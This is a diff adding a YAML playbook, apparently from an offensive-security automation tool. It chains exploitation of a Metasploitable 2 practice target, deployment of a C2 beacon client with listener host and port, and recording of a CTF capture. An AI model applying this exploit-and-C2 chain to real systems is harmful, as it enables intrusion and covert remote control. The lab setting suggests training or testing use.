@@ -1,0 +1,69 @@
+name: gym_ms2_foothold
+version: 1
+description: 'Deterministic Metasploitable 2 foothold path + beacon recon + CTF capture.'
+enabled: true
+tags:
+- gym
+- metasploitable2
+- foothold
+- harness
+platforms:
+- linux
+defaults:
+  lhost: 127.0.0.1
+  lport: '4444'
+  port: '21'
+  exploit: ''
+  vuln: ''
+  privilege: lowpriv
+steps:
+- id: scope
+  phase: recon
+  description: Bind the gym target.
+  run: assign target {target}
+- id: wait_beacon
+  phase: recon
+  description: Allow the auto deploy queue (discover/portscan/privesc) to run.
+  run: sleep 25
+  timeout: 40
+- id: exploit
+  phase: exploit
+  description: Run the selected YAML exploit and fan the outcome out.
+  run: python3 modules/atomic_exploit_bridge.py run --id {exploit} --rhost {target}
+    --lhost {lhost} --lport {lport} --port {port} --feed
+  timeout: 240
+  continue_on_error: false
+  sinks:
+  - world_model
+  - killchain
+  - intel_graph
+  - attack_graph
+  - c2_surfaces
+  - objectives
+  - report
+- id: deploy_agent
+  phase: post
+  description: Drop the malleable C2 client (F5 upgrades lowpriv/root profile).
+  run: c2_deploy {target} --sleep 10 --privilege {privilege}
+  timeout: 90
+  continue_on_error: true
+- id: beacon_settle
+  phase: post
+  description: Wait for beacon check-ins to spool network recon outputs.
+  run: sleep 25
+  timeout: 40
+- id: ctf_capture
+  phase: report
+  description: Verify and record the CTF capture for this path.
+  run: python3 modules/ctf_capture.py capture {vuln} {target} --search-base
+    sessions/chain_facts --search-base sessions/{target} --json-out
+  timeout: 60
+  continue_on_error: false
+  sinks:
+  - world_model
+  - report
+- id: sync
+  phase: report
+  description: Mirror world model and objectives.
+  run: lazy_sync
+  continue_on_error: true
